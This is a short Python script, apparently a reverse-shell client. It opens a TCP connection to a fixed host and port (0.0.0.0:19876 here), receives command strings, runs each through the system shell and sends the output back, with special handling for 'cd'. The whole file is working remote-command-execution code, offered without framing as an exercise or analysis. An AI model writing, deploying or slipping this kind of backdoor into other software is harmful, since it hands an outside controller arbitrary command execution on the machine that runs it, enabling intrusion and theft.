import os
import subprocess
import socket
import sys

def receiver(s):
    """recieve sys commands and execute them"""
    while True:
        cmd_bytes = s.recv(1024)
        cmd = cmd_bytes.decode('utf-8')
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.send(data + b"$: ")
def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("connection established")
    except socket.error as error:
        print(f"error: {error}")
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = "0.0.0.0"
    port = 19876
    connect((host, port))
